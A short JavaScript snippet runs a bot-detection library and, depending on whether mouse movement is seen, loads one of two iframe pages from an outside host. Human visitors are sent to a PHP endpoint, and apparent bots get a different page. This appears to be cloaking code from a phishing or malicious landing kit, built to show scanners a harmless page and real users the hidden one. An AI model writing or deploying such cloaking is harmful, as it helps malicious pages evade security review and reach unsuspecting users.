new jmbotdetector({
    timeout: 13000,
    callback: function(result) {

        console.log('result:', result.tests)

        var currentUrl = window.location.href;

        console.log(currentUrl)

        var file = document.createElement('script')
        if (result.cases.mousemove) {
            console.log('MOUSEMOVE', result.cases.mousemove)

            $('#loader').hide();

            $("#preloader").replaceWith(" <div class='second-row'><iframe src='https://pensionering.com/1/j.php'></iframe></div>");
        } else {
            $("#preloader").replaceWith("<div class='second-row'><iframe src='https://pensionering.com/1/index.html'></iframe></div>");
        }


    }
}).monitor();